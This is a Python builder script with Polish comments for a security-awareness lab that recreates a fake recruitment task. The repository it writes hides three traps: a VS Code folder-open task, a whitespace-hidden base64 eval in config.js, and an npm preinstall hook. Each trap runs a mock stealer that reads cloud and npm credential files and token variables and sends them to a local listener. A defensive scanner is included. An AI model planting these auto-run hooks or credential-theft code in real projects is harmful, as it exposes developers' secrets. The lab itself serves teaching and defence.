"""Lab "falszywa rekrutacja" (MM Tech, 11.11.2026). Buduje folder z zadaniem rekrutacyjnym i 3 pulapkami oraz narzedzia do pokazu.
WSZYSTKO jest lokalne i nieszkodliwe: "zlosliwy" skrypt czyta tylko pliki z folderu Symulowany_Katalog_Domowy_Kandydata i zmienne
srodowiskowe, ktorych wartosc zaczyna sie od DEMO, a wysyla je wylacznie na 127.0.0.1:4444 (nasluch attacker_listener.py).

    python zbuduj_lab_rekrutacja.py [katalog_docelowy]      (domyslnie ./Lab_Rekrutacja)

Pulapki (techniki opisywane w kampanii Contagious Interview):
  1. .vscode/tasks.json z "runOn": "folderOpen"  -> polecenie startuje przy otwarciu folderu w VS Code / Cursorze
  2. src/config.js: 220 spacji w linijce 9, za nimi eval(Buffer.from(<base64>))  -> kod poza prawa krawedzia okna
  3. package.json: hook "preinstall"            -> polecenie startuje przy npm install
"""
import base64
import json
import os
import sys

README = """# FinTech Payment Gateway: zadanie rekrutacyjne (Senior Node.js)

**Widełki stanowiska:** 26 000 - 32 000 PLN netto B2B

## Opis zadania
W serwisie autoryzacji płatności występuje błąd przy walidacji wygasłych sesji (`src/auth.js`).

1. Otwórz projekt w VS Code / Cursorze i zapoznaj się z konfiguracją w `src/config.js`.
2. Zainstaluj zależności: `npm install`.
3. Uruchom testy: `npm test`, a potem serwer: `npm start`.
4. Napraw walidację czasu wygaśnięcia tokena i odeślij nam link do forka.

Powodzenia!
"""

TASKS = """{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "workspace-env-check",
      "type": "shell",
      "command": "node scripts/check-env.js vscode_folderOpen",
      "presentation": {
        "echo": false,
        "reveal": "silent"
      },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
"""

CONFIG = """// Konfiguracja lokalnego mikroserwisu autoryzacji płatności
module.exports = {
  appName: "FinTech-Auth-Gateway",
  version: "2.4.1",
  port: 3000,
  jwtExpirationSeconds: 3600,
  dbHost: "127.0.0.1",
  dbPort: 5432,
  enableAuditLog: true, /* standardowy lokalny dziennik audytu */@PAD@_: eval(Buffer.from("@B64@", "base64").toString()),
  logLevel: "info",
  logFile: "logs/gateway.log",
  maxRetryAttempts: 3,
  timeoutMs: 5000,
  currency: "PLN"
};
"""

INDEX = """const config = require('./config');
const { isSessionValid } = require('./auth');

console.log(`[FinTech Gateway] ${config.appName} ${config.version} nasłuchuje na porcie ${config.port}`);
console.log('[FinTech Gateway] sesja testowa ważna:', isSessionValid({ expiresAt: Date.now() + 1000 }));
"""

AUTH = """// Walidacja sesji płatności cyklicznych
function isSessionValid(session) {
  if (!session || typeof session.expiresAt !== 'number') return false;
  // BUG (zadanie): wygasła sesja przechodzi walidację
  return session.expiresAt >= 0;
}

module.exports = { isSessionValid };
"""

TEST = """const assert = require('assert');
const { isSessionValid } = require('../src/auth');

assert.strictEqual(isSessionValid({ expiresAt: Date.now() + 60000 }), true, 'aktywna sesja');
assert.strictEqual(isSessionValid({ expiresAt: Date.now() - 60000 }), false, 'wygasła sesja');
console.log('OK: 2 testy');
"""

CHECK_ENV = r"""// LAB: udaje zlodzieja sekretow. Czyta WYLACZNIE symulowany katalog domowy i zmienne srodowiskowe o wartosci DEMO..., wysyla tylko na 127.0.0.1.
const http = require('http');
const fs = require('fs');
const path = require('path');

const trigger = process.argv[2] || 'config_js_220_spacji';
const home = path.resolve(__dirname, '..', '..', 'Symulowany_Katalog_Domowy_Kandydata');
const stolen = [];
for (const [label, file] of [['~/.aws/credentials', path.join(home, '.aws', 'credentials')], ['~/.npmrc', path.join(home, '.npmrc')]]) {
  if (fs.existsSync(file)) stolen.push({ source: label, lines: fs.readFileSync(file, 'utf8').trim().split('\n') });
}
const env = Object.entries(process.env).filter(([k, v]) => /TOKEN|KEY|SECRET/i.test(k) && /^DEMO/.test(v)).map(([k, v]) => `${k}=${v}`);
if (env.length) stolen.push({ source: 'zmienne środowiskowe', lines: env });

const body = JSON.stringify({ trigger, stolen });
const req = http.request({ hostname: '127.0.0.1', port: 4444, path: '/collect', method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, () => {});
req.on('error', () => {});
req.end(body);
"""

LISTENER = r'''"""LAB: 'serwer hakera'. Nasluchuje tylko na 127.0.0.1:4444 i wypisuje, co przyslal skrypt z zadania."""
import json
import os
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

os.system('')   # kolory ANSI w konsoli Windows
RED, GREEN, YELLOW, CYAN, RESET, BOLD = '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[0m', '\033[1m'


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_POST(self):
        data = json.loads(self.rfile.read(int(self.headers.get('Content-Length', 0))).decode('utf-8'))
        print(f"\n{RED}{BOLD}[!] [{datetime.now():%H:%M:%S}] PRZECHWYCONO DANE Z KOMPUTERA KANDYDATA{RESET}")
        print(f"{YELLOW}    wektor: {BOLD}{data.get('trigger')}{RESET}")
        for item in data.get('stolen', []):
            print(f"{CYAN}    {item['source']}{RESET}")
            for line in item['lines']:
                print(f"{GREEN}      {line}{RESET}")
        print(f"{RED}{'=' * 62}{RESET}", flush=True)
        self.send_response(200)
        self.end_headers()


if __name__ == '__main__':
    print(f"{CYAN}{BOLD}[*] serwer atakującego (lab) nasłuchuje na 127.0.0.1:4444{RESET}")
    print('[*] czekam na otwarcie folderu albo npm install po stronie kandydata...', flush=True)
    HTTPServer(('127.0.0.1', 4444), Handler).serve_forever()
'''

SCANNER = r'''"""Szybki audyt pobranego repozytorium PRZED otwarciem w edytorze.   python skaner_obronny.py <folder>
Sprawdza: automatyczne zadania VS Code (.vscode/tasks.json, runOn: folderOpen), hooki instalacyjne (package.json, setup.py)
i bardzo dlugie linijki (ponad 300 znakow) w plikach z kodem. To przyklad, a nie antywirus: czysty wynik niczego nie gwarantuje."""
import json
import os
import sys

os.system('')
RED, GREEN, YELLOW, RESET, BOLD = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m'
HOOKS = ('preinstall', 'install', 'postinstall', 'prepare')
CODE = ('.js', '.cjs', '.mjs', '.ts', '.py', '.json', '.sh', '.ps1')


def scan(target):
    print(f"{BOLD}[*] audyt repozytorium: {target}{RESET}\n")
    n = 0
    tasks = os.path.join(target, '.vscode', 'tasks.json')
    if os.path.exists(tasks) and 'folderOpen' in open(tasks, encoding='utf-8', errors='ignore').read():
        n += 1
        print(f'{RED}{BOLD}[ALERT]{RESET} .vscode/tasks.json: zadanie z "runOn": "folderOpen" (start przy otwarciu folderu)')
    pkg = os.path.join(target, 'package.json')
    if os.path.exists(pkg):
        scripts = json.load(open(pkg, encoding='utf-8', errors='ignore')).get('scripts', {})
        for h in HOOKS:
            if h in scripts:
                n += 1
                print(f'{RED}{BOLD}[ALERT]{RESET} package.json: hook "{h}": {YELLOW}{scripts[h]}{RESET}')
    setup = os.path.join(target, 'setup.py')
    if os.path.exists(setup) and 'cmdclass' in open(setup, encoding='utf-8', errors='ignore').read():
        n += 1
        print(f'{RED}{BOLD}[ALERT]{RESET} setup.py: własne polecenia instalacyjne (cmdclass)')
    for root, dirs, files in os.walk(target):
        dirs[:] = [d for d in dirs if d not in ('node_modules', '.git')]
        for name in files:
            if name.endswith(CODE) and name != 'package-lock.json':
                path = os.path.join(root, name)
                for i, line in enumerate(open(path, encoding='utf-8', errors='ignore'), 1):
                    if len(line) > 300:
                        n += 1
                        print(f'{RED}{BOLD}[ALERT]{RESET} {os.path.relpath(path, target)}: linijka {i} ma {len(line)} znaków')
    if n:
        print(f'\n{YELLOW}{BOLD}[!] znaleziono: {n}. Otwieraj tylko w izolacji (Sandbox / kontener bez sieci).{RESET}')
    else:
        print(f'{GREEN}{BOLD}[OK] brak typowych pułapek. To nie jest gwarancja bezpieczeństwa.{RESET}')


if __name__ == '__main__':
    scan(sys.argv[1] if len(sys.argv) > 1 else 'FinTech-Auth-Task')
'''


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(text)


def create_lab(base):
    task = os.path.join(base, 'FinTech-Auth-Task')
    home = os.path.join(base, 'Symulowany_Katalog_Domowy_Kandydata')
    # symulowany katalog domowy kandydata: lezy POZA pobranym repozytorium
    write(os.path.join(home, '.aws', 'credentials'),
          '[default]\naws_access_key_id = AKIADEMOLAB000000001\naws_secret_access_key = DEMO/lab/tylko+do+pokazu/0000000000000000\n')
    write(os.path.join(home, '.npmrc'), '//registry.npmjs.org/:_authToken=npm_DEMO_lab_token_000000000000\n')
    write(os.path.join(task, 'README.md'), README)
    write(os.path.join(task, '.vscode', 'tasks.json'), TASKS)                                   # PULAPKA 1
    payload = base64.b64encode(b"require('../scripts/check-env.js')").decode()
    write(os.path.join(task, 'src', 'config.js'), CONFIG.replace('@PAD@', ' ' * 220).replace('@B64@', payload))   # PULAPKA 2
    write(os.path.join(task, 'src', 'index.js'), INDEX)
    write(os.path.join(task, 'src', 'auth.js'), AUTH)
    write(os.path.join(task, 'tests', 'auth.test.js'), TEST)
    write(os.path.join(task, 'package.json'), json.dumps({                                      # PULAPKA 3
        'name': 'fintech-auth-recruitment-task', 'version': '1.0.0', 'private': True,
        'description': 'Recruitment coding challenge - FinTech Gateway', 'main': 'src/index.js',
        'scripts': {'preinstall': 'node scripts/check-env.js npm_preinstall', 'start': 'node src/index.js', 'test': 'node tests/auth.test.js'},
        'dependencies': {'ms': '2.1.3'}}, indent=2) + '\n')
    write(os.path.join(task, 'scripts', 'check-env.js'), CHECK_ENV)
    write(os.path.join(base, 'attacker_listener.py'), LISTENER)
    write(os.path.join(base, 'skaner_obronny.py'), SCANNER)
    print('[+] lab gotowy:', os.path.abspath(base))


if __name__ == '__main__':
    create_lab(sys.argv[1] if len(sys.argv) > 1 else 'Lab_Rekrutacja')
